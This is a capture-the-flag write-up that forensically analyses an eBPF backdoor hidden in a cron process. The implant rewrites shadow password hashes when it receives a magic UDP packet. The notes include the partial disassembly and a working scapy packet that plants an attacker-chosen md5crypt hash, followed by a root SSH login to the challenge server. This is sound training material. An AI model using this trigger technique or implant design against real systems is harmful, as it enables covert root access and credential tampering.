## Quest
Egg Hunt
After moving laterally, PROTECTIVE PENGUIN compromised a number of additional systems and gained persistence. We have identified another host in the DMZ that we believe was backdoored by the adversary and is used to regain access.
Please download a virtual machine image of that host and identify the backdoor. Validate your findings in our test environment on egghunt.challenges.adversary.zone.

Hint:
Snapshot is (at least) compatible with current QEMU versions available in Arch Linux and Fedora 33 (5.1.0, 5.2.0).







./run.sh 
Restoring snapshot compromised (art_ctf_egghunt_local.qcow2)
Press Return...
qemu-system-x86_64: warning: TSC frequency mismatch between VM (2400004 kHz) and host (2903497 kHz), and TSC scaling unavailable

root@egghunt:~# netstat -pantu
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:4422            0.0.0.0:*               LISTEN      379/sshd: /usr/sbin 
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      365/systemd-resolve 
tcp6       0      0 :::4422                 :::*                    LISTEN      379/sshd: /usr/sbin 
udp        0      0 127.0.0.53:53           0.0.0.0:*                           365/systemd-resolve 
udp        0      0 0.0.0.0:68              0.0.0.0:*                           587/dhclient 

qemu setup does host-guest forwarding: hostfwd=tcp::4422-:4422,hostfwd=udp::1337-:1337

udp 1337 does not have a listen service in netstat?

sudo nmap -sU -p1337 localhost
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-24 19:56 CET
Nmap scan report for localhost (127.0.0.1)
Host is up.
Other addresses for localhost (not scanned): ::1

PORT     STATE         SERVICE
1337/udp open|filtered menandmice-dns

Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds


sudo nmap -sU -p 1337,53,68 egghunt.challenges.adversary.zone 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-24 20:00 CET
Nmap scan report for egghunt.challenges.adversary.zone (144.76.211.234)
Host is up (0.012s latency).
rDNS record for 144.76.211.234: static.234.211.76.144.clients.your-server.de

PORT     STATE         SERVICE
53/udp   closed        domain
68/udp   open|filtered dhcpc
1337/udp closed        menandmice-dns

/var/log/syslog.1
Jan 14 12:15:17 egghunt kernel: [   86.289920] cron[971] is installing a program with bpf_probe_write_user helper that may corrupt user memory!
Jan 14 12:14:22 egghunt kernel: [   32.332403] audit: type=1400 audit(1610626462.740:13): apparmor="DENIED" operation="open" profile="/{,usr/}sbin/dhclient" name="/proc/587/task/588/comm" pid=587 comm="dhclient" requested_mask="wr" denied_mask="wr" fsuid=0 ouid=0
Jan 14 12:14:22 egghunt kernel: [   32.332652] audit: type=1400 audit(1610626462.740:14): apparmor="DENIED" operation="open" profile="/{,usr/}sbin/dhclient" name="/proc/587/task/589/comm" pid=587 comm="dhclient" requested_mask="wr" denied_mask="wr" fsuid=0 ouid=0
Jan 14 12:14:22 egghunt kernel: [   32.332775] audit: type=1400 audit(1610626462.740:15): apparmor="DENIED" operation="open" profile="/{,usr/}sbin/dhclient" name="/proc/587/task/590/comm" pid=587 comm="dhclient" requested_mask="wr" denied_mask="wr" fsuid=0 ouid=0

/var/log/kern.log.1
Jan 14 12:14:22 egghunt kernel: [   32.332402] kauditd_printk_skb: 2 callbacks suppressed
Jan 14 12:14:22 egghunt kernel: [   32.332403] audit: type=1400 audit(1610626462.740:13): apparmor="DENIED" operation="open" profile="/{,usr/}sbin/dhclient" name="/proc/587/task/588/comm" pid=587 comm="dhclient" requested_mask="wr" denied_mask="wr" fsuid=0 ouid=0
Jan 14 12:14:22 egghunt kernel: [   32.332652] audit: type=1400 audit(1610626462.740:14): apparmor="DENIED" operation="open" profile="/{,usr/}sbin/dhclient" name="/proc/587/task/589/comm" pid=587 comm="dhclient" requested_mask="wr" denied_mask="wr" fsuid=0 ouid=0
Jan 14 12:14:22 egghunt kernel: [   32.332775] audit: type=1400 audit(1610626462.740:15): apparmor="DENIED" operation="open" profile="/{,usr/}sbin/dhclient" name="/proc/587/task/590/comm" pid=587 comm="dhclient" requested_mask="wr" denied_mask="wr" fsuid=0 ouid=0
Jan 14 12:15:17 egghunt kernel: [   86.289920] cron[971] is installing a program with bpf_probe_write_user helper that may corrupt user memory!
Jan 14 12:15:31 egghunt kernel: [   86.289928] cron[971] is installing a program with bpf_probe_write_user helper that may corrupt user memory!



-> crontab seems empty for root

root         379  0.0  1.5  13072  7388 ?        Ss   18:21   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups


root@egghunt:/var/log# lsof -i
COMMAND   PID            USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
systemd-r 365 systemd-resolve   12u  IPv4  20531      0t0  UDP 127.0.0.53:domain
systemd-r 365 systemd-resolve   13u  IPv4  20532      0t0  TCP 127.0.0.53:domain (LISTEN)
sshd      379            root    3u  IPv4  21311      0t0  TCP *:4422 (LISTEN)
sshd      379            root    4u  IPv6  21322      0t0  TCP *:4422 (LISTEN)
dhclient  587            root    9u  IPv4  23072      0t0  UDP *:bootpc


# dump process memory / core dump
gcore 379 

havent found obviously interesting strings nor nopslep in core.379
# looking for 1337 (udp/1337)
root@egghunt:/tmp# xxd core.379 | grep "3905"
-> no luck chasing dump of sshd

recheck syslog.1 and kern.log.1 -> weird cron behaviour


gcore cron (974) 

kali@rurapente:/mnt/hgfs/Crowdstrike-Adversary-Quest-2021/protective penguin/egg hunt$ strings -t x core.974 | grep bpf
   6266 nodev   bpf
   6928 implant_bpf
   6ac8 implant_bpf
   9ba7 /home/user/git/bcc/libbpf-tools/implant.bpf.c

bpf implant might make sense if there is a port knock mechanism to open udp/1337

strings -t x core.974 | grep backdoor
   a79b backdoor_hash
   a7bc backdoor


BPF consists of eleven 64 bit registers with 32 bit subregisters, a program counter and a 512 byte large BPF stack space. Registers are named r0 - r10. The operating mode is 64 bit by default, the 32 bit subregisters can only be accessed through special ALU (arithmetic logic unit) operations. The 32 bit lower subregisters zero-extend into 64 bit when they are being written to.
Register r10 is the only register which is read-only and contains the frame pointer address in order to access the BPF stack space. The remaining r0 - r9 registers are general purpose and of read/write nature.
A BPF program can call into a predefined helper function, which is defined by the core kernel (never by modules). The BPF calling convention is defined as follows:
r0 contains the return value of a helper function call.
r1 - r5 hold arguments from the BPF program to the kernel helper function.
r6 - r9 are callee saved registers that will be preserved on helper function call.

https://docs.cilium.io/en/latest/bpf/



root@egghunt:~# bpftool -p prog
[{
        "id": 3,
        "type": "cgroup_skb",
        "tag": "6deef7357e7b4530",
        "gpl_compatible": true,
        "loaded_at": 1611691485,
        "uid": 0,
        "bytes_xlated": 64,
        "jited": true,
        "bytes_jited": 66,
        "bytes_memlock": 4096
    },{
        "id": 4,
        "type": "cgroup_skb",
        "tag": "6deef7357e7b4530",
        "gpl_compatible": true,
        "loaded_at": 1611691485,
        "uid": 0,
        "bytes_xlated": 64,
        "jited": true,
        "bytes_jited": 66,
        "bytes_memlock": 4096
    },{
        "id": 5,
        "type": "cgroup_skb",
        "tag": "6deef7357e7b4530",
        "gpl_compatible": true,
        "loaded_at": 1611691485,
        "uid": 0,
        "bytes_xlated": 64,
        "jited": true,
        "bytes_jited": 66,
        "bytes_memlock": 4096
    },{
        "id": 6,
        "type": "cgroup_skb",
        "tag": "6deef7357e7b4530",
        "gpl_compatible": true,
        "loaded_at": 1611691485,
        "uid": 0,
        "bytes_xlated": 64,
        "jited": true,
        "bytes_jited": 66,
        "bytes_memlock": 4096
    },{
        "id": 7,
        "type": "cgroup_skb",
        "tag": "6deef7357e7b4530",
        "gpl_compatible": true,
        "loaded_at": 1611691486,
        "uid": 0,
        "bytes_xlated": 64,
        "jited": true,
        "bytes_jited": 66,
        "bytes_memlock": 4096
    },{
        "id": 8,
        "type": "cgroup_skb",
        "tag": "6deef7357e7b4530",
        "gpl_compatible": true,
        "loaded_at": 1611691486,
        "uid": 0,
        "bytes_xlated": 64,
        "jited": true,
        "bytes_jited": 66,
        "bytes_memlock": 4096
    },{
        "id": 16,
        "type": "tracepoint",
        "name": "kprobe_netif_re",
        "tag": "e0d014d973f44213",
        "gpl_compatible": true,
        "loaded_at": 1611691566,
        "uid": 0,
        "bytes_xlated": 2344,
        "jited": true,
        "bytes_jited": 1544,
        "bytes_memlock": 4096,
        "map_ids": [4
        ],
        "btf_id": 5
    },{
        "id": 17,
        "type": "kprobe",
        "name": "getspnam_r_entr",
        "tag": "acab388c8f8ef0f9",
        "gpl_compatible": true,
        "loaded_at": 1611691566,
        "uid": 0,
        "bytes_xlated": 336,
        "jited": true,
        "bytes_jited": 223,
        "bytes_memlock": 4096,
        "map_ids": [3
        ],
        "btf_id": 5
    },{
        "id": 18,
        "type": "kprobe",
        "name": "getspnam_r_exit",
        "tag": "ceeabb4ac5b9ed45",
        "gpl_compatible": true,
        "loaded_at": 1611691566,
        "uid": 0,
        "bytes_xlated": 328,
        "jited": true,
        "bytes_jited": 209,
        "bytes_memlock": 4096,
        "map_ids": [3,4
        ],
        "btf_id": 5
    }
]


bpftool cgroup tree
CgroupPath
ID       AttachType      AttachFlags     Name           
/sys/fs/cgroup/unified/system.slice/systemd-udevd.service
    6        ingress                                        
    5        egress                                         
/sys/fs/cgroup/unified/system.slice/systemd-journald.service
    4        ingress                                        
    3        egress                                         
/sys/fs/cgroup/unified/system.slice/systemd-logind.service
    8        ingress                                        
    7        egress  

root@egghunt:~# bpftool perf
pid 974  fd 9: prog_id 16  tracepoint  netif_receive_skb
pid 974  fd 10: prog_id 17  uprobe  filename /lib/x86_64-linux-gnu/libc.so.6  offset 1174224
pid 974  fd 11: prog_id 18  uretprobe  filename /lib/x86_64-linux-gnu/libc.so.6  offset 1174224

-> libc.so.6 offset 1174224 (0x11ead0) -> function getspnam_r
The getspnam_r() function is like getspnam() but stores the retrieved shadow password structure in the space pointed to by spbuf.


bpftool btf list
5: size 6600B  prog_ids 18,17,16  map_ids 4,3


bpftool map list
3: hash  name args  flags 0x0
        key 8B  value 8B  max_entries 10  memlock 4096B
        btf_id 5
4: array  name implant_.bss  flags 0x400
        key 4B  value 36B  max_entries 1  memlock 8192B
        btf_id 5


bpftool map dump id 4
[{
        "value": {
            ".bss": [{
                    "backdoor": {
                        "enabled": false,
                        "hash": ""
                    }
                }
            ]
        }
    }
]

bpftool -j map dump id 4
[{"key":["0x00","0x00","0x00","0x00"],"value":["0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00"],"formatted":{"value":{".bss":[{"backdoor":{"enabled":false,"hash":""}}]}}}]

http://www.brendangregg.com/blog/2016-02-08/linux-ebpf-bcc-uprobes.html


```
root@egghunt:/proc/974/fd# ls -la
total 0
dr-x------ 2 root root  0 Jan 26 20:14 .
dr-xr-xr-x 9 root root  0 Jan 14 12:15 ..
lr-x------ 1 root root 64 Jan 26 20:14 0 -> /dev/null
l-wx------ 1 root root 64 Jan 26 20:14 1 -> /dev/null
lrwx------ 1 root root 64 Jan 26 20:14 10 -> 'anon_inode:[perf_event]'
lrwx------ 1 root root 64 Jan 26 20:14 11 -> 'anon_inode:[perf_event]'
lrwx------ 1 root root 64 Jan 26 20:14 12 -> /run/crond.pid
lrwx------ 1 root root 64 Jan 26 20:14 13 -> 'socket:[24485]'
l-wx------ 1 root root 64 Jan 26 20:14 2 -> /dev/null
lr-x------ 1 root root 64 Jan 26 20:14 3 -> anon_inode:btf
lrwx------ 1 root root 64 Jan 26 20:14 4 -> anon_inode:bpf-map
lrwx------ 1 root root 64 Jan 26 20:14 5 -> anon_inode:bpf-map
lrwx------ 1 root root 64 Jan 26 20:14 6 -> anon_inode:bpf-prog
lrwx------ 1 root root 64 Jan 26 20:14 7 -> anon_inode:bpf-prog
lrwx------ 1 root root 64 Jan 26 20:14 8 -> anon_inode:bpf-prog
lrwx------ 1 root root 64 Jan 26 20:14 9 -> 'anon_inode:[perf_event]'
```
```
root@egghunt:/proc/974/fd# lsof -p 974
COMMAND PID USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME
cron    974 root  cwd       DIR                8,2     4096  12762 /var/spool/cron
cron    974 root  rtd       DIR                8,2     4096      2 /
cron    974 root  txt       REG                8,2    55944   9199 /usr/sbin/cron
cron    974 root  mem       REG                8,2    27002 133105 /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
cron    974 root  mem       REG                8,2    55904   8798 /usr/lib/x86_64-linux-gnu/libnss_files-2.32.so
cron    974 root  mem       REG                8,2  3041456  15771 /usr/lib/locale/locale-archive
cron    974 root  mem       REG                8,2   151232   8834 /usr/lib/x86_64-linux-gnu/libpthread-2.32.so
cron    974 root  mem       REG                8,2    27064   8662 /usr/lib/x86_64-linux-gnu/libcap-ng.so.0.0.0
cron    974 root  mem       REG                8,2   584392   8819 /usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.9.0
cron    974 root  mem       REG                8,2    18816   8678 /usr/lib/x86_64-linux-gnu/libdl-2.32.so
cron    974 root  mem       REG                8,2   133200   8652 /usr/lib/x86_64-linux-gnu/libaudit.so.1.0.0
cron    974 root  mem       REG                8,2   113032   8909 /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
cron    974 root  mem       REG                8,2   109200   8688 /usr/lib/x86_64-linux-gnu/libelf-0.181.so
cron    974 root  mem       REG                8,2  1995896   8660 /usr/lib/x86_64-linux-gnu/libc-2.32.so
cron    974 root  mem       REG                8,2   163256   8844 /usr/lib/x86_64-linux-gnu/libselinux.so.1
cron    974 root  mem       REG                8,2    68320   8809 /usr/lib/x86_64-linux-gnu/libpam.so.0.84.2
cron    974 root  mem       REG               0,13           12123 anon_inode:bpf-map (stat: No such file or directory)
cron    974 root  mem       REG               0,25   257416      4 /dev/shm/x86_64-linux-gnu/libc.so.7
cron    974 root  mem       REG                8,2   195584   8629 /usr/lib/x86_64-linux-gnu/ld-2.32.so
cron    974 root    0r      CHR                1,3      0t0      6 /dev/null
cron    974 root    1w      CHR                1,3      0t0      6 /dev/null
cron    974 root    2w      CHR                1,3      0t0      6 /dev/null
cron    974 root    3r  a_inode               0,13        0  12123 btf
cron    974 root    4u  a_inode               0,13        0  12123 bpf-map
cron    974 root    5u  a_inode               0,13        0  12123 bpf-map
cron    974 root    6u  a_inode               0,13        0  12123 bpf-prog
cron    974 root    7u  a_inode               0,13        0  12123 bpf-prog
cron    974 root    8u  a_inode               0,13        0  12123 bpf-prog
cron    974 root    9u  a_inode               0,13        0  12123 [perf_event]
cron    974 root   10u  a_inode               0,13        0  12123 [perf_event]
cron    974 root   11u  a_inode               0,13        0  12123 [perf_event]
cron    974 root   12u      REG               0,24        4    436 /run/crond.pid
cron    974 root   13u     unix 0xffff96bbcd1f6000      0t0  24485 type=DGRAM
```

prog 16 could be some kind of port knock check

 96: (55) if r1 != 0x66 goto pc+194
  97: (b7) r1 = 36
; AAAAAAAAAAAAAAAAAAAAAAA
  98: (73) *(u8 *)(r10 -294) = r1
  99: (b7) r1 = 12580
 100: (6b) *(u16 *)(r10 -296) = r1
 101: (71) r1 = *(u8 *)(r10 -293)
 102: (a7) r1 ^= 66
 103: (73) *(u8 *)(r10 -293) = r1
 104: (71) r1 = *(u8 *)(r10 -292)
 105: (a7) r1 ^= 66
 106: (73) *(u8 *)(r10 -292) = r1
 107: (71) r1 = *(u8 *)(r10 -291)
 108: (a7) r1 ^= 66

xor key 66?


Name

netif_receive_skb — process receive buffer from network

Synopsis

int netif_receive_skb ( struct sk_buff * skb);

pid 974 fd 9: prog_id 16 tracepoint netif_receive_skb

might check all incoming packets
for magic packet

prog 17 writes to 
  36: (18) r1 = map[id:3]
  38: (b7) r4 = 0
  39: (85) call htab_map_update_elem#134224

progs 17/18 with getspnam_r read from maps 3,4 and writes with call bpf_probe_write_user (maybe into ssh process or somewhere else)

prog 16 checks magic packet and writes map 4
I think they might manipulate the hash
after xoring stuff

 194: (18) r1 = map[id:4][0]+0
 196: (79) r2 = *(u64 *)(r10 -272)
 197: (bf) r3 = r2
 198: (77) r3 >>= 56
 199: (73) *(u8 *)(r1 +32) = r3
 200: (bf) r3 = r2
 201: (77) r3 >>= 48
 202: (73) *(u8 *)(r1 +31) = r3


prog 17:
int getspnam_r_entry(long long unsigned int * ctx):
  26: (85) call bpf_probe_read_compat#-54752
  28: (85) call bpf_get_current_pid_tgid#119360
  36: (18) r1 = map[id:3]
  39: (85) call htab_map_update_elem#134224

prog 18:
int getspnam_r_exit(long long unsigned int * ctx):
   0: (85) call bpf_get_current_pid_tgid#119360
   4: (18) r1 = map[id:3]
   6: (85) call __htab_map_lookup_elem#128720
  17: (85) call bpf_probe_read_user#-60320
  19: (18) r1 = map[id:4][0]+0
  31: (85) call bpf_probe_write_user#-59968
  36: (18) r1 = map[id:3]
  38: (85) call htab_map_delete_elem#134016

prog 16:
int kprobe_netif_receive_skb(struct netif_receive_skb_args * args):
port 1337, xor, stuff, write map 3

```
  33: (79) r3 = *(u64 *)(r1 +8)                 # r1 = pointer to skb + 8
  34: (bf) r6 = r10
  35: (07) r6 += -256
  36: (bf) r1 = r6
  37: (b7) r2 = 224
  38: (85) call bpf_probe_read_compat#-54752    # read 224 bytes from skb + 8
  39: (69) r1 = *(u16 *)(r6 +180)
  40: (79) r2 = *(u64 *)(r6 +192)
  41: (bf) r6 = r2
  42: (0f) r6 += r1
  43: (15) if r2 == 0x0 goto pc+6               # ?
  44: (bf) r1 = r10
  45: (07) r1 += -24
  46: (b7) r2 = 20
  47: (bf) r3 = r6
  48: (85) call bpf_probe_read_compat#-54752    # read 20 bytes (likely ip header?)
  49: (55) if r0 != 0x0 goto pc+241             # exit on fail
  50: (bf) r1 = r10
  51: (07) r1 += -24
  52: (71) r1 = *(u8 *)(r1 +0)
  53: (57) r1 &= 240
  54: (55) if r1 != 0x40 goto pc+236            # exit on ip version != 4 (ip[0] & 0xf0 != 0x40
  55: (bf) r1 = r10
  56: (07) r1 += -24
  57: (71) r1 = *(u8 *)(r1 +9)                  # offset 9 into ip header = protocol
  58: (55) if r1 != 0x11 goto pc+232            # exit if not udp
  59: (bf) r1 = r10
  60: (07) r1 += -24
  61: (71) r1 = *(u8 *)(r1 +0)
  62: (57) r1 &= 15
  63: (55) if r1 != 0x5 goto pc+227             # exit if ip[0] & 0x0f != 5 (ip header len != 20)

  64: (07) r6 += 20                             # set read pointer behind ip header
  65: (bf) r1 = r10
  66: (07) r1 += -32
  67: (b7) r2 = 8
  68: (bf) r3 = r6
  69: (85) call bpf_probe_read_compat#-54752    # read 8 bytes of packet data (udp header)
  70: (55) if r0 != 0x0 goto pc+220             # exit on fail
  71: (bf) r1 = r10
  72: (07) r1 += -32
  73: (69) r1 = *(u16 *)(r1 +2)                 # udp header offset 2 -> dst port
  74: (55) if r1 != 0x3905 goto pc+216          # 1337

  75: (bf) r1 = r10
  76: (07) r1 += -32
  77: (69) r1 = *(u16 *)(r1 +4)                 # udp header offset 4 -> length
  78: (55) if r1 != 0x2a00 goto pc+212          # 42

  86: (bf) r1 = r10
  87: (07) r1 += -296
  88: (b7) r2 = 34
  89: (bf) r3 = r6
  90: (85) call bpf_probe_read_compat#-54752    # read 34 bytes of packet data

  91: (71) r1 = *(u8 *)(r10 -296)
  92: (55) if r1 != 0x66 goto pc+198            # first data char = f

  93: (71) r1 = *(u8 *)(r10 -295)
  94: (55) if r1 != 0x73 goto pc+196            # second char = s
  95: (71) r1 = *(u8 *)(r10 -294)
  96: (55) if r1 != 0x66 goto pc+194            # third char = f
```
the checked bytes are overwritten in stack

so maybe the magic packet is just that
udp dst port 1337, len 42, data starts with fsf (0x66 0x73 0x66)
could try to fire that with scapy at the image
see what happens to the map 4

what is the definition of bpf_probe_read_compat anyways
seems to have 3 params
1: dstbuf, 2: len, 3: ?
and struct skb (which is the context in r1 at the start)

#ifdef CONFIG_ARCH_HAS_NON_OVERLAPPING_ADDRESS_SPACEBPF_CALL_3(bpf_probe_read_compat, void *, dst, u32, size,      const void *, unsafe_ptr)
(bearbeitet)

static const struct bpf_func_proto bpf_probe_read_compat_proto = {
        .func           = bpf_probe_read_compat,
        .gpl_only       = true,
        .ret_type       = RET_INTEGER,
        .arg1_type      = ARG_PTR_TO_UNINIT_MEM,
        .arg2_type      = ARG_CONST_SIZE_OR_ZERO,
        .arg3_type      = ARG_ANYTHING,
};


http://vger.kernel.org/~davem/skb.html

checks are:
ip version = 4, ip header len = 20 bytes, protocol = udp, dst port = 1337, udp len = 42, payload starts with fsf (0x66, 0x73, 0x66)


sudo scapy

>>> p = IP(dst="127.0.0.1")/UDP(dport=1337, len=42)/Raw("fsf"+31*"b")
>>> send(p)
.
Sent 1 packets.



-> should do something, but doesnt look like?
-> somehow the scapy crafted udp packet is not relayed through qemu port forward
-> installing scapy inside qemu image

apt install python3-scapy

$1$ is md5 (3 bytes)
31 bytes, fits perfectly after fsf to use 34 bytes of udp data

>>> packet = IP(dst="127.0.0.1")/UDP(dport=1337)/Raw("fsf"+31*"b")
>>> send(packet)
.
Sent 1 packets.
>>>                                                                             
root@egghunt:~# bpftool map dump id 4
[{
        "value": {
            ".bss": [{
                    "backdoor": {
                        "enabled": true,
                        "hash": "$1$                               "
                    }
                }
            ]
        }
    }
]
root@egghunt:~# 

approach:
I think that you can provide it with a hash
After fsf
The value is xor‘d with 66
So pick an md5 hash of your choice (hex repr!), xor it with 66 and put into udp data after fsf
And then login via ssh

mkpasswd -m md5crypt
Password: pass
$1$wtuNYIeB$Bo28F812s3/AhXWZWIcso.


xor with 66

-> 35 36 37 0c 1b 0b 27 00 66 00 2d 70 7a 04 7a 73 70 31 71 6d 03 2a 1a 15 18 15 0b 21 31 2d 6c
https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Decimal','string':'66'%7D,'Standard',false)To_Hex('Space',0)&input=d3R1TllJZUIkQm8yOEY4MTJzMy9BaFhXWldJY3NvLg

31 bytes to add after fsf in udp data


p = IP(dst="127.0.0.1")/UDP(dport=1337, len=0x2a)/Raw("fsf"+"\x35\x36\x37\x0c\x1b\x0b\x27\x00\x66\x00\x2d\x70\x7a\x04\x7a\x73\x70\x31\x71\x6d\x03\x2a\x1a\x15\x18\x15\x0b\x21\x31\x2d\x6c")

>>> p = IP(dst="127.0.0.1")/UDP(dport=1337, len=0x2a)/Raw("fsf"+"\x35\x36\x37\x0
...: c\x1b\x0b\x27\x00\x66\x00\x2d\x70\x7a\x04\x7a\x73\x70\x31\x71\x6d\x03\x2a\x
...: 1a\x15\x18\x15\x0b\x21\x31\x2d\x6c")
>>> send(p)
.
Sent 1 packets.
>>> quit()
root@egghunt:/proc/974/fd# bpftool -p map dump id 4
[{
        "key": ["0x00","0x00","0x00","0x00"
        ],
        "value": ["0x01","0x24","0x31","0x24","0x77","0x74","0x75","0x4e","0x59","0x49","0x65","0x42","0x24","0x42","0x6f","0x32","0x38","0x46","0x38","0x31","0x32","0x73","0x33","0x2f","0x41","0x68","0x58","0x57","0x5a","0x57","0x49","0x63","0x73","0x6f","0x2e","0x00"
        ],
        "formatted": {
            "value": {
                ".bss": [{
                        "backdoor": {
                            "enabled": true,
                            "hash": "$1$wtuNYIeB$Bo28F812s3/AhXWZWIcso."
                        }
                    }
                ]
            }
        }
    }
]


>>> p = IP(dst="egghunt.challenges.adversary.zone")/UDP(dport=1337, len=0x2a)/Raw("fsf"+"\x35\x36\x37\x0c\x1b\x0b\x27\x00\x66\x00\x2d\x70\x7a\x04\x7a\x73\x70\x31\x71\x6d\x03\x2a\x1a\x15\x18\x15\x0b\x21\x31
...: \x2d\x6c")
>>> p
<IP  frag=0 proto=udp dst=Net('egghunt.challenges.adversary.zone') |<UDP  dport=1337 len=42 |<Raw  load="fsf567\x0c\x1b\x0b'\x00f\x00-pz\x04zsp1qm\x03*\x1a\x15\x18\x15\x0b!1-l" |>>>
>>> send(p)
.
Sent 1 packets.

ssh -l root egghunt.challenges.adversary.zone
root@egghunt.challenges.adversary.zone's password: 
PTY allocation request failed on channel 0
CS{ebpf_b4ckd00r_ftw}
Connection to egghunt.challenges.adversary.zone closed.